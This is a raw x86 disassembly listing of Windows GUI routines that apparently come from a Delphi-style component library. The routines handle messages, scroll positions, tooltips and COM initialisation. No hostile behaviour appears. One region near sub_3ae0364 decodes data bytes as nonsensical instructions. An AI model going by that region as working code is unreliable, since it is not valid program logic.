cmp [ esi + 0x302 ] 0x0
je r-xdata
cmp [ esi + 0x34a ] 0x0
je r-xdata
movzx eax [ ebp - 0x7 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
movzx eax [ ebp - 0x6 ]
push eax
push ebx
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x304 ]
call [ esi + 0x300 ]
movzx eax [ ebp - 0x6 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x34c ]
call [ esi + 0x348 ]
sub_3adf640
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x30a ] 0x0
je r-xdata
cmp [ esi + 0x352 ] 0x0
je r-xdata
movzx eax [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
push ebx
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x30c ]
call [ esi + 0x308 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x354 ]
call [ esi + 0x350 ]
sub_3adf6b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebx + 0x258 ]
call sub_3aae444
cmp [ ebx + 0x382 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x258 ]
call sub_3a89f04
mov eax [ esi + 0x24 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x258 ]
call sub_3a8a0b8
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x384 ]
call [ ebx + 0x380 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3adf730
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x3a2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x3a4 ]
call [ ebx + 0x3a0 ]
sub_3adf774
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3adf8cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x258 ]
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_3a89c5c
mov eax [ ebx + 0x2e0 ]
call sub_3a7b21c
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adf8d2
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_3a652c4
retn
inc eax
mov [ ebp - 0xc ] eax
xor edi edi
inc edi
dec [ ebp - 0xc ]
jne r-xdata
xor edx edx
mov eax [ esi + 0x10 ]
call sub_3a8990c
mov edx edi
mov eax [ ebx + 0x2e0 ]
call sub_3ada078
mov edx [ eax + 0x20 ]
mov eax [ esi + 0xc ]
call sub_3a89220
mov edx edi
mov eax [ ebx + 0x2e0 ]
call sub_3ada078
lea edx [ ebp - 0x2c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_3a8a0b8
mov edx edi
mov eax [ ebx + 0x2e0 ]
call sub_3ada078
mov edx [ eax + 0x20 ]
mov eax [ esi + 0x10 ]
call sub_3a89828
mov dl 0x2
mov eax [ esi + 0x10 ]
call sub_3a8990c
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_3ade890
mov eax [ ebp - 0x24 ]
neg eax
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_3ade890
mov eax [ ebp - 0x20 ]
neg eax
mov [ ebp - 0x8 ] eax
mov edx edi
mov eax [ ebx + 0x2e0 ]
call sub_3ada078
push esi
push edi
lea esi [ eax + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a67398
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_3a8a008
mov edx edi
mov eax [ ebx + 0x2e0 ]
call sub_3ada078
lea edx [ ebp - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp [ ebp - 0x28 ] 0x0
je r-xdata
sub_3adf8dc
push ebx
mov ebx eax
mov eax ebx
call sub_3ab5ae8
movzx eax [ ebx + 0x25d ]
sub al 0x2
jae r-xdata
pop ebx
retn
cmp [ ebx + 0x2e4 ] 0x0
je r-xdata
mov eax ebx
call sub_3adf774
sub_3adf914
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3adfa2d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3aa ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab25b4
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x2c ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_3aded9c
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adfa34
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x24 ]
call sub_3a65338
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x11c ]
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_3adaa14
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_3aaf610
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_3aaf610
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi eax
mov eax [ esi + 0x8 ]
push esi
push edi
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ esi + 0x8 ]
add eax 0x38
mov edx [ ebp - 0x4 ]
call sub_3a652f4
push 0xe
call GetSystemMetrics
add eax [ edi + 0x1c ]
mov [ edi + 0xc ] eax
push 0xd
call GetSystemMetrics
add eax [ edi + 0x18 ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_3aaf4fc
mov edx [ esi + 0x8 ]
mov [ edx + 0x10 ] eax
xor eax eax
mov [ esi + 0xc ] eax
jmp r-xdata
sub_3adfa5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3adfa98
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov [ ebx + 0x2c8 ] esi
mov eax ebx
call sub_3ab7c38
push esi
push 0x0
push 0x1047
push eax
call __imp_SendMessageA
jmp r-xdata
sub_3adfa98
push ebx
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebx + 0x2c8 ]
pop ebx
retn
mov eax ebx
call sub_3ab7c38
push 0x0
push 0x0
push 0x1048
push eax
call __imp_SendMessageA
pop ebx
retn
sub_3adfac8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
movzx eax [ ebx + 0x290 ]
xor al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
pop ebx
retn
sub_3adfb00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_3aded9c
test eax eax
jne r-xdata
push esi
push edi
movzx ecx [ ebp - 0x2 ]
movzx edx [ ebp - 0x1 ]
mov eax ebx
call sub_3ab1ab4
cmp [ ebx + 0x27c ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_3adfb48
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x288 ]
call sub_3a7b21c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x288 ]
mov edx esi
call sub_3ad9dc0
cmp ebp [ eax + 0x28 ]
je r-xdata
sub_3adfb84
push ebx
push esi
add esp 0xffffffdc
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x8 ]
call sub_3a78e80
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
mov edx esi
mov eax ebx
call sub_3ab8ec4
add esp 0x24
pop esi
pop ebx
retn
mov eax ebx
call sub_3adeb50
test eax eax
je r-xdata
mov eax ebx
call sub_3adeb50
lea ecx [ esp + 0x14 ]
mov dl 0x3
call sub_3adaa14
lea eax [ esp + 0x14 ]
lea edx [ esp + 0xc ]
call sub_3a673cc
lea edx [ esp + 0xc ]
mov ecx esp
mov eax ebx
call sub_3aaf610
movzx eax [ esp ]
mov [ esp + 0x8 ] ax
movzx eax [ esp + 0x4 ]
mov [ esp + 0xa ] ax
mov eax [ esp + 0x8 ]
mov [ esi + 0x8 ] eax
sub_3adfc0c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_3ab7c38
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
call sub_3a91b8c
test al al
je r-xdata
cmp [ ebx + 0x264 ] 0xffffffff
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_3ac463c
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3ad0d70
call sub_3ad105c
test al al
je r-xdata
mov eax esi
call sub_3ad0d70
mov edx ebx
call sub_3ad1094
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x264 ] eax
push 0x0
push 0x0
push 0xb04d
mov eax [ ebx + 0x2a4 ]
push eax
call PostMessageA
pop esi
pop ebx
retn
sub_3adfc9c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x278 ]
call sub_3adab94
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x278 ]
mov edx esi
call sub_3adabcc
xor ecx ecx
mov edx 0x3
call sub_3ada6fc
inc esi
dec ebx
jne r-xdata
sub_3adfcd8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x278 ]
call sub_3adab94
mov edi eax
dec edi
test edi edi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ esi + 0x278 ]
call sub_3adabcc
mov eax [ eax + 0xc ]
push eax
mov edx ebx
mov eax [ esi + 0x278 ]
call sub_3adabcc
mov edx [ eax + 0x24 ]
mov eax [ esp + 0x4 ]
pop ecx
mov ebp [ eax ]
call [ ebp + 0xe4 ]
mov edx ebx
mov eax [ esi + 0x278 ]
call sub_3adabcc
mov edx 0x3
call sub_3ada68c
test al al
je r-xdata
sub_3adfd4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_3adace0
xor eax eax
push ebp
push sub_3adfde5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_3adab94
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adfdec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_3adaec4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov edx ebx
call sub_3adabcc
mov edx 0x3
call sub_3ada68c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov edx ebx
call sub_3adabcc
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffab
call sub_3a6457c
sub_3adfe00
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x278 ]
call sub_3adab94
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x278 ]
mov edx esi
call sub_3adabcc
mov cl 0x1
mov edx 0x3
call sub_3ada6fc
inc esi
dec ebx
jne r-xdata
sub_3adfe3c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_3adace0
xor eax eax
push ebp
push sub_3adfe89
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_3adacb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adfe90
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_3adaec4
retn
sub_3adfe9c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_3ab8850
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_3ade960
cmp [ edi + 0x268 ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_3adff00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab5df8
push 0x1
mov eax ebx
call sub_3ab7c38
push eax
call GetScrollPos
mov edi eax
mov edx esi
mov eax ebx
call sub_3ab5df8
push 0x1
mov eax ebx
call sub_3ab7c38
push eax
call GetScrollPos
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0xffffffff
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
call InvalidateRect
jmp r-xdata
sub_3adff64
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3ad2678
mov edi esi
mov eax [ edi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
lea eax [ ebx + 0x10 ]
mov edx [ edi + 0x10 ]
call sub_3a652f4
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3adffb8
push ebx
mov ebx eax
mov eax ebx
call sub_3ad277c
mov eax ebx
call sub_3a7aebc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
movzx eax [ edx + 0x1d ]
cmp al 0x2
je r-xdata
mov eax edx
call sub_3ad29e0
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_3adffec
push ebx
mov ebx eax
mov eax ebx
call sub_3ad2798
mov eax ebx
call sub_3a7aebc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
movzx eax [ edx + 0x1d ]
cmp al 0x1
je r-xdata
mov eax edx
call sub_3ad29e0
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_3ae0040
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp eax 0xffffffff
je r-xdata
mov [ ebx + 0x1c ] edx
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax ebx
call sub_3ad27a4
mov eax ebx
call sub_3a7aebc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_3ae0070
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a7afe4
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop esi
pop ebx
retn
sub_3ae00d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax esi
call sub_3ae00c4
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx [ ebp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x24 ] eax
mov edx [ ebp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_3a7aebc
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_3ae014c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_3a7b41c
mov ebp eax
mov esi ebx
mov eax edi
call sub_3a7b21c
mov ebx eax
dec ebx
sub ebx esi
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
sub_3ae0184
push ebx
push esi
mov ebx edx
mov esi eax
sub cl 0x1
jb r-xdata
mov esi ebx
mov [ esi + 0x18 ] 0xffffffff
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x24 ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x10 ]
call sub_3a652a0
pop esi
pop ebx
retn
je r-xdata
mov eax esi
call sub_3a7b52c
test [ eax + 0x1c ] 0x8
jne r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
call sub_3a7aebc
push eax
push 0x144
mov eax esi
call sub_3a7b52c
call sub_3ab7c38
push eax
call __imp_SendMessageA
sub_3ae01f4
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_3a63a44
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0xc ] eax
mov eax esp
push eax
push 0x0
push 0x404
mov eax esi
call sub_3a7b52c
call sub_3ab7c38
push eax
call __imp_SendMessageA
test eax eax
sete al
neg al
sbb ebp ebp
mov edx edi
mov eax esi
call sub_3ae0138
mov ebx eax
mov [ esp ] 0x37
mov eax [ ebx + 0x10 ]
call sub_3a65730
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_3a7aebc
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0xc ] eax
mov eax [ ebx + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx + 0x24 ]
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x14 ]
mov [ esp + 0x20 ] eax
test ebp ebp
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax esp
push eax
push edi
push 0x405
mov eax esi
call sub_3a7b52c
call sub_3ab7c38
push eax
call SendMessageA
mov eax esp
push eax
push edi
push 0x401
mov eax esi
call sub_3a7b52c
call sub_3ab7c38
push eax
call SendMessageA
jmp r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3ae0364
aas
add ebp [ esi + 0x3 ]
dec [ ecx + 0x2c083 ]
add [ ebx - 0x5efe4d35 ] cl
call 0xffffffffebb1b180
jae r-xdata
js r-xdata
add [ eax ] al
mov eax [ ebx + 0x284 ]
mov [ eax + 0x18 ] ebx
mov eax [ eax + 0x1c ]
add [ eax ] al
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x120 ]
add eax 0x2
add [ eax ] al
outsb
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
push r-xdata
call GetModuleHandleA
mov esi eax
test esi esi
je r-xdata
mov [ ebx + 0x2dc ] eax
jb r-xdata
push 0x0
call CoInitialize
push 0x2
push 0x0
call [ rw-data ]
jmp r-xdata
push r-xdata
push esi
call GetProcAddress
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
add al [ eax ]
add [ ecx + 0x408b1858 ] cl
sbb al 0x89
sbb esp 0x2
add [ eax ] al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
call sub_3a64350
mov esi eax
mov [ ebx + 0x2c4 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_3ae06c0
mov [ ebx + 0x2d8 ] 0x0
movzx eax [ r-xdata ]
mov [ ebx + 0x2b4 ] al
cmp [ rw-data ] 0x0
jne r-xdata
add [ ecx + r-xdata ] esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax + 0x1803ae ] ch
add [ eax ] al
mov ah 0x11
cmpsb [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add esi [ ebp * 2 + 0x6d4003a6 ]
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x6d ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ 0x6d6f4354 ]
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
add [ eax ] al
inc esi
and eax [ ebx ]
scasb [ edi ]
add edx [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
lodsb [ esi ]
add ebp [ esi - 0x51fcc0fd ]
add eax [ eax ]
add [ eax ] al
rcl [ ebp - 0x75 ] 0xec
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ae1084
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0x200
call sub_3ad830c
mov ecx esi
xor edx edx
mov eax ebx
call sub_3a97704
push ebx
push sub_3ae08b0
call sub_3a84724
mov [ ebx + 0x2c0 ] eax
add esp 0xfffffff0
call sub_3a646e4
sub_3ae04eb
add [ ebx + 0x56 ] dl
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x284 ]
call sub_3a64380
lea eax [ esi + 0x2c4 ]
call sub_3a6efbc
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ esi + 0x2c0 ]
call sub_3a847bc
lea eax [ esi + 0x2cc ]
call sub_3a6efbc
lea eax [ esi + 0x2b0 ]
call sub_3a66cb4
call CoUninitialize
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a977fc
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xb4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ae0564
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0xfffffcdb
je r-xdata
cmp [ esi + 0x2ea ] 0x0
je r-xdata
dec eax
jne r-xdata
pop esi
retn
mov edx esi
mov eax [ esi + 0x2ec ]
call [ esi + 0x2e8 ]
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x2e2 ] 0x0
je r-xdata
mov edx esi
mov eax [ esi + 0x2e4 ]
call [ esi + 0x2e0 ]
pop esi
retn
sub_3ae05b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x200
call sub_3ad82e0
mov edx ebx
mov eax esi
call sub_3ab3d30
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_3ab3c5c
mov eax [ ebx + 0x4 ]
or eax 0x10000
or eax 0x200000
or eax 0x2000000
or eax 0x4
or eax 0x40
movzx edx [ esi + 0x2d8 ]
or eax [ edx * 4 + rw-data ]
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfffffdff
mov eax [ ebx + 0x24 ]
or eax 0x8
and eax 0xfffffffc
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_3ae062c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x2c8 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x2c8 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x2c4 ]
call sub_3abf5ac
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov edx [ ebx + 0x2c4 ]
call sub_3abf5f0
mov edx ebx
mov eax [ ebx + 0x2c8 ]
call sub_3a83738
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_3ab0e78
mov eax ebx
call sub_3ab4518
mov eax [ ebx + 0x2c8 ]
call sub_3abec10
push eax
push 0x0
push 0x402
mov eax ebx
call sub_3ab7c38
push eax
call PostMessageA
pop esi
pop ebx
retn
sub_3ae06c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3abec10
push eax
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_3ab0e78
sub_3ae06ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_3a98010
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x2d8 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1a4 ]
call sub_3a89b74
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_3ae0734
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_3ab3c04
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x2c8 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_3ae062c
